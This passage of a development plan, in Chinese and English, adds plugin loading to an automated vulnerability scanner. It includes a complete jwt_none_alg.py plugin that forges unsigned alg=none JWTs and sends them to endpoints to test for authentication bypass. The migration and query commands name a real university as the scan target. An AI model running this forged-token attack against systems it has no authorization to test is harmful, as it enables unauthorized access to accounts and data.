git commit -m "feat: run_scan — reflect phase handler, brute → reflect → done"
```

---

## Task 9: probe_runner.py — 加载 active 插件

**Files:**
- Modify: `TOOLS/pipeline/probe_runner.py`
- Modify: `TOOLS/tests/test_reflect.py`

- [ ] **Step 1: 追加测试**

```python
def test_load_active_plugins_empty():
    from pipeline.probe_runner import load_active_plugins
    path, conn = _make_test_db()
    result = load_active_plugins(conn)
    assert result["nuclei_templates"] == []
    assert result["python_scripts"] == []
    conn.close()
    os.unlink(path)


def test_load_active_plugins_filters_inactive():
    from pipeline.probe_runner import load_active_plugins
    path, conn = _make_test_db()
    conn.execute("""
        INSERT INTO plugins (name, type, file_path, active)
        VALUES ('test-tmpl','nuclei_template','TOOLS/plugins/nuclei/test.yaml', 0)
    """)
    conn.commit()
    result = load_active_plugins(conn)
    assert result["nuclei_templates"] == []
    conn.close()
    os.unlink(path)
```

- [ ] **Step 2: 运行测试，确认失败**

```bash
python -m pytest TOOLS/tests/test_reflect.py::test_load_active_plugins_empty -v
# Expected: ERROR
```

- [ ] **Step 3: 在 probe_runner.py 追加 load_active_plugins + 调用**

在 `probe_runner.py` 的 `write_sp = _write_sp_direct` 行之后追加：

```python
def load_active_plugins(conn: sqlite3.Connection) -> dict:
    """从 plugins 表读取 active=1 的插件，按类型分组。"""
    rows = conn.execute(
        "SELECT type, file_path FROM plugins WHERE active=1 AND file_path IS NOT NULL"
    ).fetchall()
    result: dict = {"nuclei_templates": [], "python_scripts": []}
    for type_, path in rows:
        if type_ == "nuclei_template":
            result["nuclei_templates"].append(path)
        elif type_ == "python_script":
            result["python_scripts"].append(path)
    return result
```

在 `mode_nuclei` 函数中，找到 `if cookie_header:` 行（probe_runner.py:242），在其之后、`print(f"[nuclei]...` 之前插入：

```python
    # 追加 active plugins nuclei 模板（probe_runner.py:243 之后）
    active_plugins = load_active_plugins(conn)
    for tmpl_path in active_plugins["nuclei_templates"]:
        full = PROJECT_ROOT / tmpl_path
        if full.exists():
            cmd += ["-t", str(full)]
```

然后在 `probe_runner.py` 的 `main()` 函数中，找到 mode_nuclei 调用结束后（probe_runner.py 末尾的 main 函数），追加 python_script 插件执行：

在 `main()` 里 `mode_nuclei` 调用之后追加：

```python
    # 执行 active python_script 插件
    active_plugins = load_active_plugins(conn)
    for script_path in active_plugins["python_scripts"]:
        full = PROJECT_ROOT / script_path
        if full.exists():
            print(f"[probe_runner] 执行插件脚本: {script_path}")
            subprocess.run(  # noqa: S603
                [sys.executable, str(full), "--target", args.target, "--db", str(db_path)],
                timeout=120, check=False,
            )
```

- [ ] **Step 4: 运行测试**

```bash
python -m pytest TOOLS/tests/test_reflect.py -k "load_active_plugins" -v
# Expected: 2 passed
```

- [ ] **Step 5: 全量测试**

```bash
python -m pytest TOOLS/tests/test_reflect.py -v
# Expected: all passed
```

- [ ] **Step 6: Commit**

```bash
git add TOOLS/pipeline/probe_runner.py TOOLS/tests/test_reflect.py
git commit -m "feat: probe_runner — load active plugins from DB"
```

---

## Task 10: 创建 TOOLS/plugins/ 目录 + jwt_none_alg.py 初始插件

**Files:**
- Create: `TOOLS/plugins/nuclei/.gitkeep`
- Create: `TOOLS/plugins/scripts/.gitkeep`
- Create: `TOOLS/plugins/configs/.gitkeep`
- Create: `TOOLS/plugins/scripts/jwt_none_alg.py`

- [ ] **Step 1: 创建目录结构**

```bash
mkdir -p "TOOLS/plugins/nuclei" "TOOLS/plugins/scripts" "TOOLS/plugins/configs"
echo "" > "TOOLS/plugins/nuclei/.gitkeep"
echo "" > "TOOLS/plugins/scripts/.gitkeep"
echo "" > "TOOLS/plugins/configs/.gitkeep"
```

- [ ] **Step 2: 实现 jwt_none_alg.py**

新建 `TOOLS/plugins/scripts/jwt_none_alg.py`：

```python
"""JWT alg=none 绕过探测插件（reflect_map 映射，JWT 技术栈触发）。

用法: python jwt_none_alg.py --target "目标名" --db "/path/to/db"
"""
import argparse
import base64
import json
import sqlite3
import sys
import uuid
from datetime import datetime
from pathlib import Path
import urllib.request

PROJECT_ROOT = Path(__file__).resolve().parent.parent.parent.parent
sys.path.insert(0, str(PROJECT_ROOT / "TOOLS"))
from db.cookie_helper import get_auth_cookie_header  # noqa: E402
from db.db_utils import connect  # noqa: E402


def _forge_none_token(original_token: str) -> str | None:
    """将 JWT 的 alg 改为 none，签名置空。"""
    try:
        parts = original_token.split(".")
        if len(parts) != 3:
            return None
        header = json.loads(base64.b64decode(parts[0] + "=="))
        header["alg"] = "none"
        new_header = base64.b64encode(
            json.dumps(header, separators=(",", ":")).encode()
        ).rstrip(b"=").decode()
        return f"{new_header}.{parts[1]}."
    except Exception:
        return None


def run(target: str, db_path: str) -> int:
    conn = connect(db_path)
    # 找 suspicious_points 中含 JWT 的端点
    rows = conn.execute(
        "SELECT url, method FROM suspicious_points "
        "WHERE test_type='auth_surface' AND test_status='untested' LIMIT 10"
    ).fetchall()
    added = 0
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    cookie_header = get_auth_cookie_header(db_path, "")
    # 寻找 Authorization: Bearer token
    auth_rows = conn.execute(
        "SELECT token_value FROM auth_sessions WHERE token_name='Authorization' AND is_active=1 LIMIT 1"
    ).fetchall()
    bearer = auth_rows[0][0] if auth_rows else None
    forged = _forge_none_token(bearer) if bearer else None

    if not forged:
        print("[jwt_none_alg] 未找到 Bearer token，跳过")
        conn.close()
        return 0

    for url, method in rows:
        try:
            req = urllib.request.Request(url, method=method)
            req.add_header("Authorization", f"Bearer {forged}")
            resp = urllib.request.urlopen(req, timeout=10)
            if resp.getcode() == 200:
                sp_id = f"SP-JWT-{uuid.uuid4().hex[:8]}"
                conn.execute(
                    "INSERT INTO suspicious_points "
                    "(id, url, method, test_type, evidence, source, reasoning, risk, test_status, created_at) "
                    "VALUES (?, ?, ?, 'auth_bypass', ?, 'jwt_none_alg', ?, 'High', 'untested', ?) "
                    "ON CONFLICT(id) DO NOTHING",
                    (sp_id, url, method,
                     f"JWT alg=none forged token accepted (HTTP 200)",
                     "JWT 签名验证缺失，alg=none 攻击成功",
                     now),
                )
                conn.commit()
                added += 1
        except Exception:
            pass

    print(f"[jwt_none_alg] 完成: {added} 个新 SP")
    conn.close()
    return added


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=True)
    parser.add_argument("--db", required=True)
    args = parser.parse_args()
    run(args.target, args.db)


if __name__ == "__main__":
    main()
```

- [ ] **Step 3: Commit**

```bash
git add TOOLS/plugins/ 
git commit -m "feat: plugins dir + jwt_none_alg initial plugin"
```

---

## Task 11: 全量集成验证

- [ ] **Step 1: 运行全量单元测试**

```bash
python -m pytest TOOLS/tests/ -v
# Expected: 全部 passed（新增测试 + 原有 92 个）
```

- [ ] **Step 2: 静态检查**

```bash
python -m py_compile TOOLS/pipeline/reflect.py TOOLS/pipeline/reflect_map.py TOOLS/run_scan.py TOOLS/pipeline/probe_runner.py && echo "ALL OK"
```

- [ ] **Step 3: 对现有 DB 跑 migration**

```bash
python TOOLS/db/migrate.py --target "台州学院"
# 验证输出包含 migration 013 applied
```

- [ ] **Step 4: 检查 plugins 表结构**

```bash
python TOOLS/db/db_query.py --target "台州学院" ".schema plugins"
# Expected: 包含 name, type, active, source 列
```

- [ ] **Step 5: Final commit**

```bash
git add -A
git commit -m "feat: reflection phase complete — mapping layer + AI gap analysis + Feishu/Claude approval"
```
